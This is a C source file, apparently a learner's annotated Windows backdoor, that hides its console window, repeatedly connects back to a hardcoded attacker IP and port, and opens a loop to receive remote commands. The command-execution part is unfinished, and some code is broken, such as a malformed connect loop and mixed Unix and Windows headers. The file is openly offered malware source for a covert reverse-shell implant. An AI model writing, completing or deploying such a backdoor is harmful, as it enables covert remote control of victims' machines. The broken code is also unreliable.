// Loading necessary libaries for backdoor
#include <stdio.h> //Allows to do basic input output functions
#include <stdlib.h> //Allows to do basic general purpose functions like malloc
#include <unistd.h> //Allows to do UNIX OS functions like file operations and process control.
#include <string.h> //Allows string manipulation functions (text)
#include <sys/stat.h> //Allows working with file information and process control
#include <sys/types.h> //Allows working with file information and process control

//Loading windows libaries
#include <winsock2.h> //Allows program to communicate over networks.
#include <windows.h> //Windows API header, provide access to machine core functions
#include <winuser.h> //Allows to create user interface in windows applications.
#include <wininet.h> //Allow program to do internet options like downloading and uploading.
#include <windowsx.h> //Allows to do extra macro functions to make windows program easier.

#define bzero(p, size) (void) memset((p), 0, (size)) //Perfoam a same task like memset function does.
//bzero take parameter and the memory size as a input.
//define memset funtion for the following inputs.
//0 for overwrite the values by zero.


//Global Variable denotes here
int sock;

//Let's code shell void function that doesn't return any output it perfoam argument execution.
//this shell function is able to executable commands in the target.
void shell()
{

  //allocate variables.
    char buffer[1024]; // This variable used to receive the execution command from the server it consist of 1024 bytes of memory.
    //The container might be used to store a smaller portion of the output (e.g., part of the command's result), and then the data in container would be added to the total_response buffer, which accumulates the complete output from multiple read.
    char container[1024]; 
    char total_reponse[18384];


    //After creating variable jump into while true loop >> represent as "while (1)"
    while (1)
    {
      jump:
      //let's allocate the memory as zeros for all variables that we have declared.
      //the best practice to do calling sizeof function to particular variable that has been declared.
      bzero(buffer, 1024);//manually giving the size here.
      bzero(container, 1024);//same as above
      bzero(total_reponse, sizeof(total_reponse));//same operation as above.


      //Next our shell want to receive the command from the server let's perfoam.
      //recv functtion take 4 arguments lets explain
      //1st where we want to receive the command? > From Socket. that is the argument.
      //2nd  want to store the command that received from ther server > That is buffer variable.
      //3rd size of the buffer variable.
      //4th argument is 0, because not specify any argument beside the function.
      recv(sock, buffer, 1024, 0);
    }
}


//Let's Start the main function
// This function is returning integer that why we specify int int the function.
//Reason to specify 'APIENTRY' Para is every windows program consist of an entry point.
//And it's also create API access to the main program.
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
    //'HINSTANCE' - Used to handle an instance or a module(Executable) that was loaded in the memory.
    //hPrev -  Used in 16-bit windows now it's always 0.
    //Cmdline - UNICODE string act as an argument in the program.
    //CmdShow - A flag to represent minimized or maximized in the function.


    //Let's Program to make program execution invisible to the target while execution.
    HWND stealth;
    AllocConsole();//Allocate new console to the calling process.
    //below funtion handle windows top level functions window it take 2 parameters. 1 is Class name and 2 is Windows name it should be null.
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    //Reason - that we we want to show a windows to target or not.
    //It take 2 arguments. 1 one handle windows that we specify earlier.
    // 2nd arg - is 0 - Hiding the current window and activate another window.
    ShowWindow(stealth, 0);

    
    //Let'Start to create a socket to begin the connection with the bacdoor.
    //Let's create a structure of server address.(Similar to Class)

    struct sockaddr_in ServAddr;
    //let's assign server port.
    unsigned short ServPort;
    char *ServIP; //which point the memory address of the particular variable.
    WSADATA wsaData;//WSADATA is structure which consist with the windows socket informations.

    ServIP = "10.0.1.51";//here must want to apply the attacker machine IP.
    ServPort = 4444; //Make sure another process is not using same port.


    //WSAStartup is initiate a process of winsock dll by a process.
    //if successful WSAStartup function will return 0 otherwise exit the program.

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
    {
      //MAKEWORD requests winsock major and minor version (2 and 0)
      //&wsaData is a pointer to WSADATA structure which contain winsock implementation details.
        exit(1);
    }


    //define the socket object
    //must specify this variable function in out side of the main funtion. which can be able to access by other functions also.

    //AF_INET is used to establish the connection using IPV4.
    //SOCK_STREAM is used to establish TCP 3 way handshake with the target.
    //0 is we not decline anything after connection establishment.
    sock = socket(AF_INET, SOCK_STREAM, 0);

    //clear all struct variable in zeros using memset function.
    //memory location of the variable.
    //Make all the contents to zero to ServAddr.
    //Fill the memory occupied by the ServAddr structure with zeros, for the entire size of the structure.
    //which helps prevent potential issues caused by uninitialized data.
    memset(&ServAddr, 0, sizeof(ServAddr));

    //IPv4 Connection.
    ServAddr.sin_family = AF_INET;
    //Create the actual IP of our server by converting string to  IP format.
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    //define port by converting integer to port.
    ServAddr.sin_port = htons(ServPort);

    //Perfoam the connection.
    start: //Start here is a checkpoint to the connection
    while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0)
    {
      //1st argument of connect funtion is socket.
      //2nd argument specify the structre of sockaddr pointer.
      //map the sockaddr strucure to Serveraddress memory location pointer.
      //and then try to connect our target each 10 seconds.
      //the target could run the payload before start executing the server.
      //if the is equal to 0 proceed to other code otherwise make a loop because want to create connection with the target.
      sleep(10); //Sleep 10 seconds for each iterations
      //if connection established skip it otherwise goto start checkpoint to perfoam connection.
      goto start;
    }

    //if connectione was successful start the shell function.
    //which will make the attacker commands executable in the target. 
    shell();



}
